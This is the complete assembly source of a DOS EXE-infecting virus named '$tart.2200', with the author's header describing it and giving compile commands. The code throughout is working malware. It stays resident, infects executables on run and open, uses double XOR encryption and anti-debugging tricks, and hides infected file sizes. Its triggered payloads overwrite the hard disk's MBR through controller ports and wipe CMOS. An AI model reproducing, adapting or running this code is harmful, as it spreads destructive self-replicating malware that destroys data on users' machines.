   ; comment %
   ;
   ;    Sorry, my English is not very good...
   ;
   ;    Now I'm presenting for attention of respected DOS users my second and,
   ; I hope, not last virus (the first virus was named "Antipas.1101"). This virus
   ; is 2200 bytes long and is named "$tart". If it will be widespread and, as
   ; result, get into the bases of some antiviruses, I ask for name it "$tart.2200"
   ; or, in the last resort, "Start.2200". I wrote this virus for my personal
   ; purposes (see effects below), but I hope it will be useful for someone else.
   ; I'm not a distributor of this virus, so I don't bear any responsibility for the
   ; injury to the software, caused by virus. The writing of the virus was finished
   ; 18.11.1998 at 20:00. Autor - DJ Sadovnikov. And now I tell you about the virus
   ; explicitly (for whose whom laziness to look the source text).
   ;
   ;  - The general information: virus requires the 286+ processor. The check of
   ;    presence of required processor isn't made in cause of practically complete
   ;    absence of machines with CPU 86/186. The usage of 286-instructions allows to
   ;    optimize a code considerably. DOS version 3.x-6.x required. The check of
   ;    DOS version is made in cause of incorrectly virus's operation under Windows,
   ;    because Windows doesn't support SFT (for whose who doesn't know: Windows
   ;    returns DOS version 7.x). Other operational system weren't tested.
   ;  - Resident, takes up about 4500 bytes of memory. Staying resident via
   ;    correction of MCB-segment of program-carrier. There is a little bug here:
   ;    as a result of MCB correction cease to work some programs packed by EXEPACK
   ;    (but not all). I don't know why does it take place - honourly speaking,
   ;    it's lazy to look into.
   ;  - The virus infects EXE files. Doesn't touch overlays. The type of the file is
   ;    determined by the extension first, and then - by the first two bytes (MZ)
   ;    in case of this is maybe COM-file renamed into EXE. The increase of lenghth
   ;    of the infected file is 2200 bytes. While infecting file, virus corrects
   ;    both CS:IP and SS:SP. Virus infects files at the executing and opening.
   ;    While infecting, uses STF. I apologize for virus doesn't infect COM-files.
   ;    The point is that COM-files are disappearing, besides the procedure of it's
   ;    infecting will highly increase the virus's cumbersomely. Although, MZ-EXE
   ;    files will disappearing soon too. It's time for me to move on to NE-EXE and
   ;    PE-EXE infecting.
   ;  - The virus is twice encrypted. The first procedure of encryption is ordinary
   ;    XOR. The key changes from file to file. The second procedure - XOR and
   ;    SUB/ADD. The key changes from byte to byte according to easy law. The
   ;    antidebugging technology is used, based on the registration of the
   ;    decrypting procedure as an interupt Int1/Int3. The overlapping code is used
   ;    too, which complicates a research of virus after disassembling a little.
   ;  - Stealth. At the catalog reading corrects lengths of the infected files. This
   ;    method doesn't work at the performance of DIR command in cause of using FCB
   ;    by DIR. At the opening of a file the virus treats it, at the closing -
   ;    infects it again. At the executing of some archivers (see source) and
   ;    CHKDSK program virus disables it's stealth mechanism until the next file
   ;    will be executed. I hope you understand why does it necessary.
   ;  - The virus determines the real Int21h handler's address via tracing. It will
   ;    not work if somebody made the splicing (inserting a jump to itseft at the
   ;    beginning of the handler), or the antitrace protection is presented. When
   ;    the virus is in memory already, at the attempting of tracing of Int21h
   ;    handler it displays the message (see source) and halts the system.
   ;  - The Int24h (disk write-protect) stub is presented, but it doesn't correctly
   ;    work, and the cause is unknown for me.
   ;  - The 18th of May (my birthday) virus displays the text (see source) at the
   ;    top of screen and drops the chars with a sound effect. When virus infects
   ;    500th file (not on the concrete computer, and in general), it displays a
   ;    message (see source) and waits for key pressed.
   ;  - When the follow string (á ãç¥â®¬ à¥£¨áâà ) appears at the screen:
   ;    * "Show virus info" -- displays copyright message (see source)
   ;    * "Crack HDD" -- erases MBR using ports, so BIOS's "Virus Warning"
   ;                     will not help even.
   ;    * "Erase CMOS" -- erases CMOS.
   ;    * "Reboot system" -- reboots computer.
   ;  - At the virus's beginning the string "Packed file is corrupt$" is presented.
   ;    It can confuse somebody who takes into his head to look over the infected
   ;    program at the healthy computer.
   ;
   ;                                       DJ Sadovnikov (djsad@usa.net), 18.11.1998
   ;
   ;  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;
   ;      Bugs:
   ;
   ;  [!] Memory allocation is made very incorrectly.
   ;  [!] At the returning to program-carrier SS has a wrong value.
   ;  [+] The installation of Int24h handler is made incorrectly.
   ;  [+] Attemption of read/write to standart devices is possible.
   ;  [*] The procedure of search for strings at the screen has a mistake.
   ;
   ;                                       DJ Sadovnikov (djsad@usa.net), 12.04.2000
   ;
   ;  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;
   ;         Compile using TASM 4.1+
   ;
   ;            tasm /m start.asm
   ;            tlink /x start.obj
   ;            del start.obj
   ;
   ;
   ;         Files from archive:
   ;
   ;            start.asm    26140  (source of virus)
   ;            start.exe     2740  (binary of virus)
   ;            start.doc     2940  (technical information)
   ; %

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

           .286
   Code        segment
           assume  cs:Code, ds:Code

           mov ah, 9           ; Ostensibly infected program.
           mov dx, offset Msg+100h
           int 21h
           mov ah, 4Ch
           int 21h
   Msg     db  'Virus started!  $'


   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ;


   VirPar      =   word ptr (EndVir-Virus)/16+1    ; Virus's size in
                               ; paragraphs.

   Virus:      call    GetIP               ; Push IP.
           db  'Packed file is corrupt$'
   GetIP:      pop si
           sub si, 3

   Key1:       mov ax, 0               ; Decrypting virus.
           mov bx, Crypted1-Virus
           mov cx, EndCode-Crypted1
   Loop1:      xor cs:[bx+si], ah
           inc bx
           loop    Loop1
           jmp Next


   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ;

   Crypted1:

   Head        db  18h dup (0)     ; The real EXE-header.

   Int01:      add cs:[bx+si], al      ; Int1 handler. Used in virus's
           xor cs:[bx+si], ah      ; decrypting and for antidebug.
           iret

   Int03:      add ah, al          ; Int3 handler. Used for
           xor al, ah          ; dynamic key changing and for
           inc bx          ; antidebug.
           pop dx
           add dx, 9
           push    dx
           iret

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;

   Next:       push    ds

           push    0
           pop ds
           cli
           push    ds:[01h*4]      ; Saving i01 vector into stack.
           push    ds:[01h*4+2]
           mov ds:[01h*4], si      ; Installing our i01 handler.
           add ds:[01h*4], word ptr (Int01-Virus)
           mov ds:[01h*4+2], cs

           push    ds:[03h*4]      ; Saving i03 vector into stack.
           push    ds:[03h*4+2]
           mov ds:[03h*4], si      ; Installing our i03 handler.
           add ds:[03h*4], word ptr (Int03-Virus)
           mov ds:[03h*4+2], cs
           sti
                           ; Decrypting virus.
   Key2:       mov ax, 0
           mov bx, Crypted2-Virus
           mov cx, EndCode-Crypted2

   Loop2:      mov dx, 03EBh           ; Antidebugging.
           jmp $-2
   Int1:       mov ax, 01CDh           ; Int1.
           mov cs:[Int1+1-Virus+si], 90CCh ; Int3 is at the Int1's
           jmp Int1+1              ; place now.
           mov cs:[Int1+1-Virus+si], 01CDh ; Restoring Int1.
           loop    Loop2

           cli
           pop ds:[03h*4+2]        ; Restoring int3 vector.
           pop ds:[03h*4]
           pop ds:[01h*4+2]        ; Restoring int1 vector.
           pop ds:[01h*4]
           sti

           pop ds

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ;

   Crypted2:   push    ds
           push    es
           push    es

           mov ah, 30h
           int 21h         ; Getting DOS version.
           cmp al, 3           ; Exiting if it's less than 3.x.
           jb  LoadProg$
           cmp al, 7           ; Exiting if it's more than 7.x.
           jae LoadProg$

           mov ax, 0ABCDh      ; Checking the virus's presence
           int 21h         ; in memory.
           cmp ax, 0DEADh
           je  LoadProg$

           mov ax, ds          ; Releasing memory.
           dec ax
           mov es, ax
           sub es:[3], VirPar
           sub ds:[2], VirPar
           mov es, ds:[2]

           push    cs          ; Copying virus's code into
           pop ds          ; released segment of memory.
           xor di, di
           mov cx, EndCode-Virus
           cld
           push    si
           rep movsb
           pop si


           push    0
           pop ds
           cli
           mov ax, ds:[01h*4]          ; Saving Int1 vector
           mov cs:[Ofs01h+1-Virus+si], ax  ; and installing our
           mov ax, ds:[01h*4+2]        ; handler.
           mov cs:[Seg01h+1-Virus+si], ax
           mov ds:[01h*4], word ptr (Int01h-Virus)
           mov ds:[01h*4+2], es
           sti

           pushf               ; Saving into stack the address,
           push    cs          ; where the control will
           mov ax, si          ; proceed after determining of
           add ax, word ptr (Nx-Virus) ; address of real i21 handler.
           push    ax

           pushf
           pop ax
           or  ah, 00000001b   ; Setting Trace Flag
           push    ax      ; and saving flags into stack.

           push    0
           pop ds
           cli
           push    ds:[21h*4+2]    ; Saving Int21h segment into stack.
           push    ds:[21h*4]  ; Saving Int21h offset into stack.
           sti

           mov ax, 2501h
   Seg01h:     push    1234h
           pop ds
   Ofs01h:     mov dx, 0
           iret



   LoadProg$:  jmp LoadProg

   Nx:     push    0
           pop ds
           cli
           mov ax, ds:[1Ch*4]      ; Saving Int1Ch vector.
           mov es:[Ofs1Ch-Virus], ax
           mov ax, ds:[1Ch*4+2]
           mov es:[Seg1Ch-Virus], ax

           mov ax, ds:[21h*4]      ; Saving Int21h vector.
           mov es:[Ofs21h-Virus], ax
           mov ax, ds:[21h*4+2]
           mov es:[Seg21h-Virus], ax
                           ; Installing our Int1Ch handler.
           mov ds:[4*1Ch], word ptr (Int1Ch-Virus)
           mov ds:[4*1Ch+2], es
                           ; Installing our Int21h handler.
           mov ds:[4*21h], word ptr (Int21h-Virus)
           mov ds:[4*21h+2], es
                           ; Installing our Int24h handler.
           mov ds:[4*24h], word ptr (Int24h-Virus)
           mov ds:[4*24h+2], es
           sti

           mov ah, 2Ah         ; Saving date of the last
           int 65h         ; virus's installation into
           mov es:[Date-Virus], dx ; memory.
           mov es:[N+1-Virus], word ptr 0

   LoadProg:   pop ax          ; AX = ES.
           pop es
           pop ds
           add ax, 10h
           add cs:[OldCS-Virus+si], ax

   OldSS:      add ax, 0           ; Restoring SS:SP values.
           cli
           mov ss, ax
   OldSP:      mov sp, 0
           sti

           db  0EAh            ; Returning control to
   OldIP       dw  0           ; infected program.
   OldCS       dw  0





   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ;
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍŽ**€*Ž’—ˆŠˆ **…*›‚€*ˆ‰ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ;
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ;

   Int01h:     push    bx

           mov bx, sp
           cmp ss:[bx+4], 00300h   ; If DOS is loaded at the
           jb  Inst65h         ; standart address.
           cmp ss:[bx+4], 0C800h   ; If DOS is loaded at the
           jb  Quit0           ; high memory.

   Inst65h:    push    ds
           push    ax

           push    0
           pop ds
           cli
           mov ax, ss:[bx+2]
           mov ds:[65h*4], ax      ; Saving real i21 vector
           mov ax, ss:[bx+4]       ; into i65 vector.
           mov ds:[65h*4+2], ax
           sti

           pop ax
           pop ds
                           ; Clearing Trace Flag.
           and ss:[bx+7], byte ptr 11111110b

   Quit0:      pop bx
           iret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ;

   Int1Ch:     pushf
           pusha
           push    ds
           push    es

           cmp cs:[Date-Virus], 0512h      ; Is 18.05.xx today?
           jne NoEffect

           mov bx, Birthday-Virus  ; Today is my birthday.
           mov di, 34
           call    WriteText

           in  al, 61h
           or  al, 00000011b
           out 61h, al

           mov dx, 43h
           mov al, 00001011b
           out dx, al

           dec dx
   N:      mov bx, 0
           mov al, bl
           out dx, al
           mov al, bh
           out dx, al

           push    0B800h
           pop ds
           mov ax, ds:[bx]
           xchg    ax, ds:[bx+160]
           mov ds:[bx], ax

           add bx, 160
           cmp bx, 3840
           jb  NoEffect
           sub bx, 3838
           cmp bx, 160
           jb  NoEffect
           xor bx, bx
   NoEffect:   mov cs:[N+1-Virus], bx


           mov bx, ShowInfo-Virus  ; Displaying copyright message.
           call    SeekStr
           or  al, al
           jz  NextSeek1

           mov bx, Copyright-Virus
           mov di, 1490
           call    WriteText

   NextSeek1:  mov bx, CrackHDD-Virus  ; Distroying MBR.
           call    SeekStr
           or  al, al
           jz  NextSeek2

           mov dx, 1F6h
           mov al, 10100000b       ; Setting the number of device
           out dx, al          ; and head.
           mov dx, 1F2h
           mov al, 00000001b
           out dx, al          ; Setting quantity of sectors.
           inc dx
           out dx, al          ; Setting the sector's number.
           inc dx
           xor al, al
           out dx, al          ; Setting the cylinder's number.
           inc dx
           out dx, al          ; Setting the cylinder's number.
           mov dx, 1F7h
           mov al, 00110000b       ; Command for controller:
           out dx, al          ; write a sector.
   Pause:      in  al, dx          ; Waiting while data exchanging.
           test    al, 00001000b
           jz  Pause
           mov cx, 256
           xor si, si
           mov dx, 1F0h
           rep outsw           ; Data output into the buffer.

   NextSeek2:  mov bx, EraseCMOS-Virus ; Erasing CMOS.
           call    SeekStr
           or  al, al
           jz  NextSeek3

           xor ax, ax
   Loop3:      out 70h, al         ; Setting the cell's number.
           xchg    al, ah
           out 71h, al         ; Filling it with zero.
           xchg    al, ah
           inc al
           cmp al, 128
           jne Loop3

   NextSeek3:  mov bx, Reboot-Virus    ; Rebooting the computer.
           call    SeekStr
           or  al, al
           jz  Quit1

           db  0EAh            ; JMP FAR F000:E05B
           dw  0E05Bh
           dw  0F000h

   Quit1:      pop es
           pop ds
           popa
           popf

           db  0EAh
   Ofs1Ch      dw  0
   Seg1Ch      dw  0


   ShowInfo    db  'Show virus info',0
   CrackHDD    db  'Crack HDD',0
   EraseCMOS   db  'Erase CMOS',0
   Reboot      db  'Reboot system',0

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ;

   Int24h:     mov al, 3           ; Int24h stub, if the diskette
           iret                ; is write-protected.

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ;

   Int21h:     pushf

           push    ax

           pushf
           pop ax
           test    ah, 00000001b       ; Checking Trace Flag.
           jz  NoTrace

           mov di, 1650
           mov bx, Warning-Virus
           call    WriteText
           cli
           hlt

   NoTrace:    pop ax

           cmp ax, 0ABCDh      ; Indication of memory infected.
           jne L0
           mov ax, 0DEADh
           popf
           iret

   L0:     mov cs:[Flag-Virus], byte ptr 0
           pusha
           push    ds
           push    es

           cmp cs:[StFlag-Virus], byte ptr 0
           jne L1

           cmp ah, 4Eh         ; Hiding the virus's length
           je  Stealth         ; at the catalog reading using
           cmp ah, 4Fh         ; FindFirst/FindNext.
           je  Stealth
           cmp ah, 3Dh         ; Treating at the file opening.
           je  Cure

   L1:     cmp ax, 4B00h       ; Infecting at the executing.
           je  Infect
           cmp ah, 3Eh         ; Infecting at the closing.
           jne L2
           not byte ptr cs:[Flag-Virus]
           jmp Close
   L2:     jmp Quit5

   Infect:     jmp Infect$

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ;

   Stealth:    int 65h
           mov cs:[OldAX-Virus+1], ax  ; Saving AX.
           pushf
           pop cs:[OldFL-Virus+4]  ; Saving flags.
           jc  Quit2

           mov ah, 2Fh         ; Getting DTA address
           int 65h         ; into ES:BX.
           jc  Quit2

           test    byte ptr es:[bx+15h], 00011000b ; Are we searching for
           jnz Quit2               ; catalog or volume
                               ; label?

           mov ah, es:[bx+16h]         ; Check for infection.
           and ah, 00011111b
           cmp ah, 00011111b
           jne Quit2

           and es:[bx+16h], byte ptr 11100000b     ; Putting zero
                                   ; into the
                                   ; second's field.
           sub word ptr es:[bx+1Ah], EndCode-Virus ; Hiding
           sbb word ptr es:[bx+1Ch], 0         ; increase of
                                   ; length of file.
   Quit2:      pop es
           pop ds
           popa
           popf

           push    bx
           mov bx, sp
   OldFL:      mov ss:[bx+6], word ptr 0   ; Restoring flags.
   OldAX:      mov ax, 0           ; Restoring AX.
           pop bx
           iret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ;

   Cure:       call    OpenFile        ; Opening file.
           jc  Quit5           ; Error?

           call    GetAdrSFT       ; Getting SFT address into ES:DI.
           jc  Quit5           ; Error?

           call    TestFile        ; Check for infection.
           jne Quit4

           mov cx, EndCode-Head    ; Moving pointer to
           call    SeekF           ; the old header.

           call    ReadHead        ; Reading old header.
           jc  Quit5           ; Error?

           mov cx, EndCode-(Key1+1)    ; Moving pointer to
           call    SeekF           ; the decrypting key.

           mov cx, 2           ; Reading key.
           mov dx, (Key3+1)-Virus
           call    ReadF
           jc  Quit5

   Key3:       mov ax, 0           ; Decrypting header.
           mov cx, 18h
           mov si, Head-Virus
   Loop4:      xor cs:[si], ah
           inc si
           loop    Loop4

           mov dx, Head-Virus
           call    WriteHead       ; Writing new header.
           jc  Quit5           ; Error?

           mov cx, EndCode-Virus   ; Moving pointer to
           call    SeekF           ; beginning of virus.

           mov ah, 40h         ; Deleting virus from file.
           xor cx, cx
           int 65h
           jc  Quit5           ; Error?

           and es:[di+13], byte ptr 11100000b  ; Putting zero into
                               ; the second's field.

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;

   Quit3:      mov ax, 5701h       ; Restoring time and date
           mov cx, es:[di+13]      ; of file creating.
           mov dx, es:[di+15]
           int 65h
           jc  Quit5

   Quit4:      cmp cs:[Flag-Virus], byte ptr 0FFh
           je  Quit5
           mov ah, 3Eh         ; Closing file.
           int 65h

           call    TestCount       ; Was the infected file 500th?

   Quit5:      pop es
           pop ds
           popa
           popf

           db  0EAh            ; Returning contron to
   Ofs21h      dw  0           ; the old int21h handler.
   Seg21h      dw  0

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;

   Infect$:    call    Compare         ; Checking name of executed
                           ; program.

           call    OpenFile        ; Opening file.
           jc  Quit5           ; Error?

   Close:      call    GetAdrSFT       ; Getting SFT address.
           jc  Quit5           ; Error?

           call    TestFile        ; Check for infection.
           je  Quit4

           cmp es:[di+40], 'XE'    ; Checking file type
           jne Quit4           ; by the extension.

           call    SeekStart       ; Moving pointer to
                           ; the beginning of file.
           call    ReadHead        ; Reading header.
           jc  Quit5           ; Error?

           push    cs
           pop ds
           cmp ds:[Head-Virus], 'ZM'   ; Checking file type by
           jne Quit4           ; the first two bytes.

           mov cx, 18h
           xor si, si          ; Copying 18h bytes from
   Loop5:      mov ah, ds:[si+Head-Virus]  ; Head into Tmp variable.
           mov ds:[si+Tmp-Virus], ah
           inc si
           loop    Loop5

           call    GetFSize        ; Getting file size.
           mov cx, 512         ; Calculating file size in
           div cx          ; 512-byte units.
           or  dx, dx
           jz  L3
           inc ax

   L3:     cmp ax, ds:[Tmp-Virus+4]    ; Checking for overlays.
           jne Quit4           ; Exiting if presented.
           cmp dx, ds:[Tmp-Virus+2]
           jne Quit4

           mov ax, ds:[Tmp-Virus+0Eh]  ; Saving SS.
           mov ds:[OldSS-Virus+1], ax
           mov ax, ds:[Tmp-Virus+10h]  ; Saving SP.
           mov ds:[OldSP-Virus+1], ax
           mov ax, ds:[Tmp-Virus+16h]  ; Saving CS.
           mov ds:[OldCS-Virus], ax
           mov ax, ds:[Tmp-Virus+14h]  ; Saving IP.
           mov ds:[OldIP-Virus], ax

           call    GetFSize        ; Getting file size.
           add ax, EndCode-Virus   ; DX:AX = the size of file
           adc dx, 0           ; with virus.
           mov cx, 512         ; Calculation the new file size
           div cx          ; in 512-byte units.
           or  dx, dx
           jz  L4
           inc ax

   L4:     mov ds:[Tmp-Virus+4], ax    ; Putting new size into header.
           mov ds:[Tmp-Virus+2], dx

           call    GetFSize        ; Getting file size.
           mov cx, 16          ; Calculating the entry point
           div cx          ; into paragraphs.
           sub ax, ds:[Tmp-Virus+8]    ; Minus header's length.
           mov ds:[Tmp+16h-Virus], ax  ; New entry segment.
           mov ds:[Tmp+14h-Virus], dx  ; New entry offset.

           mov ds:[Tmp-Virus+0Eh], ax  ; Setting stack address by
           mov ax, EndCode-Virus+100h  ; 100h bytes behind the virus.
           mov ds:[Tmp-Virus+10h], ax

           push    0
           pop ds

           mov ax, ds:[46Ch]
           mov cs:[Key1-Virus+1], ax   ; KEY1 = random number.
           push    ax

           mov ax, ds:[46Ch]
           mov cs:[Key2-Virus+1], ax   ; KEY2 = random number.
           push    ax

           push    cs
           pop ds

           mov cx, EndCode-Virus       ; Copying virus into
           xor si, si              ; Buffer variable.
   Loop6:      mov ah, ds:[si]
           mov ds:[Buffer-Virus+si], ah
           inc si
           loop    Loop6

           pop ax              ; Crypting virus the
           mov cx, EndCode-Crypted2        ; first time.
           mov si, Buffer-Virus+Crypted2-Virus
   Loop7:      xor ds:[si], ah
           sub ds:[si], al
           add ah, al
           xor al, ah
           inc si
           loop    Loop7

           pop ax              ; Crypting virus the
           mov cx, EndCode-Crypted1        ; second time.
           mov si, Buffer-Virus+Crypted1-Virus
   Loop8:      xor ds:[si], ah
           inc si
           loop    Loop8

           xor cx, cx          ; Moving pointer to the end
           call    SeekF           ; of file.

           mov cx, EndCode-Virus
           mov dx, Buffer-Virus    ; Writing virus to the file.
           call    WriteF
           jc  Quit5$

           mov dx, Tmp-Virus       ; Writing a new header.
           call    WriteHead
           jc  Quit5$

           mov cs:[Flag-Virus], byte ptr 80h

           or  es:[di+13], byte ptr 00011111b  ; Putting 31 into the
           jmp Quit3               ; second's field.


   Quit5$:     jmp Quit5





   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ;
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ*Ž„**Žƒ*€ŒŒ›ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ;
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ;

   TestFile:   mov ah, es:[di+13]      ; Check for infection.
           and ah, 00011111b
           cmp ah, 00011111b
           ret

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;

   OpenFile:   mov ax, 3D00h       ; Opening file.
           int 65h
           mov bx, ax
           ret

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;

   GetAdrSFT:  push    bx          ; Getting SFT address into ES:DI.
           mov ax, 1220h
           int 2Fh
           jc  L5
           mov bl, es:[di]
           mov ax, 1216h
           int 2Fh
   L5:     pop bx
           jc  L6
           mov es:[di+2], byte ptr 10b ; The file is opened for
   L6:     ret             ; read/write now.

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;

   GetFSize:   mov ax, es:[di+17]      ; DX:AX = file size.
           mov dx, es:[di+19]
           ret

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;

   ReadHead:   mov cx, 18h         ; Reading header of EXE-file.
           mov dx, Head-Virus
   ReadF:      mov ah, 3Fh         ; Reading from file CX bytes
           push    cs          ; info buffer DX.
           pop ds
           int 65h
           ret

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;

   WriteHead:  call    SeekStart       ; Moving pointer to
           mov cx, 18h         ; beginning of file.
   WriteF:     mov ah, 40h         ; Writing to file CX bytes
           push    cs          ; from buffer DX.
           pop ds
           int 65h
           ret

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;

   SeekF:      call    GetFSize        ; Moving pointer by CX bytes
           sub ax, cx          ; from the end of file.
           sbb dx, 0
           mov es:[di+21], ax
           mov es:[di+23], dx
           ret

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;

   SeekStart:  mov es:[di+21], word ptr 0  ; Moving pointer to the
           mov es:[di+23], word ptr 0  ; beginning of file.
           ret

